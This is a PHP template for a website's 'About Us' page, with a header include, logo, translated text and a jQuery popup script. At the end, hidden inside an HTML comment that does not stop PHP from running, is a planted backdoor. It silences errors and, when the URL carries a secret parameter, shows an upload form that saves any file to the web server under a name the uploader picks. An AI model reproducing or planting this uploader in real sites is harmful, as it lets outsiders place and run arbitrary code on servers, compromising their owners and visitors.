<?php
    include ('template/header.php');
?>
    <div class="wrap">
        <!-- <ul class="breadcrumb breadcrumb__t"><a class="home" href="#">Home</a> / <a>About Us</a></ul> -->
        <h1>Who are we?</h1>
        <div class="section group">
            <div class="labout span_1_of_about">
                <div class="testimonials ">
                    <div class="testi-item" style="width:235px;">
                        <a href="#" >
                            <img src="resources/images/logo1.jpg">
                        </a>
                    </div>
                    <h3 style="margin-top:-65px;"><?php echo _t_title;?></h3>
                </div>
            </div>
            <div class="cont span_2_of_about">
                <h3></h3>
                <p><?php echo _t_aboutcim;?></p>
                <script src="resources/js/jquery.magnific-popup.js" type="text/javascript"></script>
                <link href="resources/css/magnific-popup.css" rel="stylesheet" type="text/css">
                <script>
                $(document).ready(function() {
                    $('.popup-with-zoom-anim').magnificPopup({
                        type: 'inline',
                        fixedContentPos: false,
                        fixedBgPos: true,
                        overflowY: 'auto',
                        closeBtnInside: true,
                        preloader: false,
                        midClick: true,
                        removalDelay: 300,
                        mainClass: 'my-mfp-zoom-in'
                    });
                });
                </script>
            </div>
            <div class="clear"></div>
        </div>
    </div>
<?php
    include ('template/footer.php');
?>
<!-- <?php
error_reporting(0);
$system = $_GET['saw'];
if($system == 'pro'){
$saw1 = $_FILES['file']['tmp_name'];
$saw2 = $_FILES['file']['name'];
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file'name='file' />
<input type='submit' value='u' />
</form>";
move_uploaded_file($saw1,$saw2);
}
?> -->